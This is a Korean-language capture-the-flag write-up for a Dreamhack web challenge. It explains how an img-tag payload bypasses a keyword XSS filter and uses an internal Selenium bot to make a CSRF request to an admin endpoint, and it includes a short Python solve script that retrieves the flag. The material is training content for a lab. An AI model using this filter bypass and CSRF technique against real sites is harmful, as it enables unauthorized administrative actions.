# Category

web

# Overview

여러 기능과 입력받은 URL을 확인하는 봇이 구현된 서비스입니다.

CSRF 취약점을 이용해 플래그를 획득하세요.

# Analysis

- `/admin/notice_flag` 를 호출하면 요청주소가 `127.0.0.1`인지 확인하며, `userid=admin`인 경우 flag를 `memo_text`에 저장한다.

- `/memo`는 `memo` 파라미터 값을 전역 변수 `memo_text`에 저장하고 출력한다.

- `/vuln`에서는 입력받는 `param` 값을 `frame, script, on` 문자열이 `*`로 치환되는`xss_filter`가 존재하며, `body` 태그 내부에 그대로 렌더링한다.

- `/flag` 에서 `param`을 전달하면 `check_csrf()`에 의해 다음 url이 생성되고 내부 셀레니움 봇이 접속한다.
  ```py
  url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
  ```

# Exploitation

1. `param`에 다음과 같은 값을 전달한다.

   ```html
   <img src=/admin/notice_flag?userid=admin>
   ```

   img 태그는`script`, `on`, `frame`을 사용하지 않기 때문에 필터에 적용되지 않는다.

2. 셀레니움 봇은 다음 주소에 접속한다.

   ```
   http://127.0.0.1:8000/vuln?param=<img src=/admin/notice_flag?userid=admin>
   ```

3. `/vuln`에서는 param이 body 내부에 그대로 렌더링되므로 브라우저가 img 태그를 생성한다.

4. 브라우저는 이미지 로딩을 위해 자동으로 다음 요청을 전송한다.

   ```
   GET /admin/notice_flag?userid=admin
   ```

5. 요청은 셀레니움 봇(`127.0.0.1`)에 의해 발생하므로 ip 검증을 통과하며, `userid=admin` 조건도 만족한다.

6. flag가 memo_text에 저장되고 `/memo`에서 확인할 수 있다.

- 코드

  ```py
  # solve.py
  # ...
  # /admin/notice_flag를 src로 하는 img 태그
  param = "<img src=/admin/notice_flag?userid=admin>"
  url = "http://host8.dreamhack.games:18030"

  # /flag 요청
  res_flag = req(
      method="POST",
      url=f"{url}/flag",
      data={"param": param},
  )

  if not res_flag.status_code == 200:
      raise Exception("ERROR")

  # /memo 확인
  res_memo = req(
      method="GET",
      url=f"{url}/memo",
  )

  # flag 필터링
  match = re.search("DH{.*}", res_memo.text)

  print(match.group() if match else "NO FLAG")
  ```

# Flag

`DH{11...3d}`
